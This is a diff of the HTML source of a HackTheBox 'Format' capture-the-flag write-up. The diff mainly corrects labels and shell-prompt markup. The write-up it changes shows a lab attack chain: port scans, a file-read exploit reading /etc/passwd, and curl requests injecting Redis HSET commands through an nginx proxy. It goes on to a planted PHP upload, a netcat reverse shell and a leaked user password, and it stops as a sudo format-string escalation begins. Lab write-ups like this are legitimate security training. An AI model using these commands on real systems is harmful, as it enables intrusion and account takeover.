@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Format</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Medium</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">05</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Format</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Medium</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">05</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Format</h3><br/>
 Format is a medium-difficulty machine in which we need to exploit a web service to read system files. We achieve this by inspecting the page's source code hosted on port <code>3000</code> in a repository of the <code>Gitea</code> service.<br/><br/>
@@ -48,7 +48,7 @@ As the user <code>cooper</code>, we have sudo privileges to execute a Python pro
 <h3><br>Recon</br></h3><br>
 Before we start with the exploitation, let's begin with enumeration. Machines expose services, and these services are exposed through ports.<br/><br/>
 With that in mind, we'll initiate a port scanning:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
 
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.213</span>
 <span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65532</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
@@ -60,7 +60,7 @@ With that in mind, we'll initiate a port scanning:<br/><br/>
 
 Once we've completed the initial port scanning to identify the open ports on the victim machine (using the TCP protocol), we'll perform a comprehensive scan on these open ports. The goal is to recognize the technologies, services, and versions running on these ports that we've discovered.<br/><br/>
 Once again, we'll use <code>nmap</code> to perform this scan:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">3000</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">3000</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.213</span> <span class="p">(</span><span class="mf">10.10.11.213</span><span class="p">)</span>
 <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
 
@@ -81,7 +81,7 @@ Once again, we'll use <code>nmap</code> to perform this scan:<br/><br/>
 
 At first glance, we can see that port 22 belongs to the SSH service, port 80 belongs to HTTP (a web service), and port 3000 is also associated with an HTTP service.<br/><br/>
 One important note is that we are given a domain when accessing port 3000 via HTTP. Therefore, we should add it to the <code>/etc/hosts</code> file to enable proper resolution.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -95,13 +95,13 @@ One important note is that we are given a domain when accessing port 3000 via HT
 </pre></div>
 
 Before accessing the web services through the browser, I always like to run a technology scan using the <code>whatweb</code> tool.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.213</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.213</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.213</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.213</span><span class="p">],</span> <span class="n">Meta</span><span class="o">-</span><span class="n">Refresh</span><span class="o">-</span><span class="n">Redirect</span><span class="p">[</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
 <span class="n">ERROR</span> <span class="n">Opening</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span> <span class="n">no</span> <span class="n">address</span> <span class="k">for</span> <span class="n">app</span><span class="o">.</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span>
 </pre></div>
 
 When performing the scan on port 80, an error is reported because an attempt is made to access a subdomain that cannot be resolved. To resolve the subdomain, we should add it to the <code>/etc/hosts</code> file.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -131,7 +131,7 @@ We can specify the subdomain we want to use:<br/><br/>
 Upon creation, we are presented with the following:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/7.png"/><br/><br/>
 We can try to access the site that was created. However, since it is accessed through a new subdomain, we need to add it to the <code>/etc/hosts</code> file in order to resolve it:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
 <span class="mf">127.0.0.1</span>   <span class="n">localhost</span>
 <span class="mf">127.0.1.1</span>   <span class="n">kali</span><span class="o">.</span><span class="n">localhost</span> <span class="n">kali</span>
 
@@ -253,7 +253,7 @@ First and foremost, we will create a script to automate the file reading process
 </pre></div>
 
 Once the script is finished, we test its functionality by attempting to read the <code>/etc/passwd</code> file:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="s2">"/etc/passwd"</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span> <span class="s2">"/etc/passwd"</span>
 
 <span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span>\<span class="o">/</span><span class="n">root</span><span class="p">:</span>\<span class="o">/</span><span class="nb">bin</span>\<span class="o">/</span><span class="n">bash</span>
 <span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span><span class="p">:</span>\<span class="o">/</span><span class="n">usr</span>\<span class="o">/</span><span class="n">sbin</span>\<span class="o">/</span><span class="n">nologin</span>
@@ -310,7 +310,7 @@ Recalling the structure shown in <a href="https://exploit-notes.hdks.org/exploit
 </pre></div>
 
 First, we make the request to <code>/static</code> (as shown in the nginx configuration), and using an <code>HSET</code> request, we will alter the <code>first-name</code> field for the key <code>elswix</code> (remember that the key belongs to our username), and finally, we will assign the value <code>PWNED</code> to the <code>first-name</code> field.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">HSET</span> <span class="s1">'http://microblog.htb/static/unix:/var/run/redis/redis.sock:elswix</span><span class="si">%20f</span><span class="s1">irst-name%20PWNED%20/a'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">HSET</span> <span class="s1">'http://microblog.htb/static/unix:/var/run/redis/redis.sock:elswix</span><span class="si">%20f</span><span class="s1">irst-name%20PWNED%20/a'</span>
 </pre></div>
 
 If we now reload the page where our blog is hosted, we can see that we have successfully changed the value of the <code>first-name</code> field in our account.<br/><br/>
@@ -324,7 +324,7 @@ Upon reading the code, we notice that users with the <code>true</code> value in 
 We can upload images, and they are stored in the <code>/uploads</code> section, which initially, as a non-privileged user, we cannot access:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/29.png"/><br/><br/>
 With this knowledge and taking advantage of our ability to alter database values through the vulnerability we found, let's change the value of the <code>pro</code> field for our user to <code>true</code>.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">HSET</span> <span class="s1">'http://microblog.htb/static/unix:/var/run/redis/redis.sock:elswix%20pro%20true%20/a'</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">HSET</span> <span class="s1">'http://microblog.htb/static/unix:/var/run/redis/redis.sock:elswix%20pro%20true%20/a'</span>
 </pre></div>
 
 We reload the blog editing page and see the following:<br/><br/>
@@ -344,7 +344,7 @@ By sending this, the <code>run.php</code> file will be created in the <code>/upl
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/36.png"/><br/><br/>
 Quickly, we will send a reverse shell to our attacker machine.<br/><br/>
 First, we need to set up a listener:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
@@ -352,44 +352,44 @@ First, we need to set up a listener:<br/><br/>
 
 Next, we send the reverse shell by executing the following:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/38.png"/><br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.213</span><span class="p">:</span><span class="mf">43784.</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">620</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
-<span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
+<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
 </pre></div>
 
 We have successfully accessed the system, now we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
 <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
 <span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
-<span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
+<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
 <span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 
-<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
 <span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
                                <span class="n">reset</span>
 <span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
 <span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
 </pre></div>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
-<span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
-<span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~/</span><span class="n">microblog</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">uploads</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as cooper</br></h3><br>
 The first thing that came to mind after accessing the system was to list other system-level users:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="n">home</span>
 <span class="n">total</span> <span class="mi">8</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">cooper</span> <span class="n">cooper</span> <span class="mi">4096</span> <span class="n">May</span> <span class="mi">22</span> <span class="mi">20</span><span class="p">:</span><span class="mi">41</span> <span class="n">cooper</span>
 <span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">git</span>    <span class="n">git</span>    <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">18</span> <span class="mi">23</span><span class="p">:</span><span class="mi">20</span> <span class="n">git</span>
-<span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 First, I thought of connecting to <code>Redis</code> using the <code>redis-cli</code> tool, specifying the path to the <code>redis.sock</code> file since there is no mention of the service being exposed through ports:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span> 
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">redis</span><span class="o">-</span><span class="n">cli</span> <span class="o">-</span><span class="n">s</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span> 
 <span class="n">redis</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">redis</span><span class="o">/</span><span class="n">redis</span><span class="o">.</span><span class="n">sock</span><span class="o">&gt;</span>
 </pre></div>
 
@@ -419,20 +419,20 @@ There's one that belongs to the user <code>cooper</code>. We can try listing its
 </pre></div>
 
 We have the password for the user <code>cooper</code> leaked in line number 4. We can try testing it by performing a system-level user migration:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span> <span class="n">cooper</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="nd">-</span><span class="nd">data<span class="nd">@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">su</span> <span class="n">cooper</span>
 <span class="n">Password</span><span class="p">:</span> <span class="n">zooperdoopercooper</span>
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span>
 </pre></div>
 
 Now that we are logged in as the user <code>cooper</code>, we can view the first flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span> <span class="n">cd</span>
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="err">$</span> <span class="n">cd</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
 <span class="n">d23e9</span><span class="o">**********************</span><span class="n">feca4</span>
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as root</br></h3><br>
 If we list the sudo privileges for the user <code>cooper</code>, we see the following:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
 <span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">cooper</span><span class="p">:</span> 
 <span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">cooper</span> <span class="n">on</span> <span class="nb">format</span><span class="p">:</span>
     <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
@@ -440,14 +440,14 @@ If we list the sudo privileges for the user <code>cooper</code>, we see the foll
 
 <span class="n">User</span> <span class="n">cooper</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="nb">format</span><span class="p">:</span>
     <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span>
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 The user <code>cooper</code> can run the program <code>/usr/bin/license</code> as root.<br/><br/>
 When listing the file type for <code>license</code>, we see that it is a Python script:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">file</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">file</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span>
 <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span><span class="p">:</span> <span class="n">Python</span> <span class="n">script</span><span class="p">,</span> <span class="n">ASCII</span> <span class="n">text</span> <span class="n">executable</span>
-<span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 If we analyze the program carefully, we notice that we could potentially exploit a <code>Python Format String Vulnerability</code>. While searching for information, I came across the following article: <a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">Python Format String Vulnerabilities</a>.<br/><br/>
@@ -471,15 +471,15 @@ Upon further reading of the code, we see that what's stored in the <code>license
 <img alt="" src="https://elswix.github.io/writeups/htb/medium/format/img/43.png"/><br/><br/>
 <h3><br>Exploitation</br></h3><br>
 Firstly, if we input a user through the <code>provision</code> parameter, we get the following report:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix</span>
+<div class="highlight"><pre><span></span><span class="nd">cooper@format</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">license</span> <span class="o">-</span><span class="n">p</span> <span class="n">elswix</span>
 
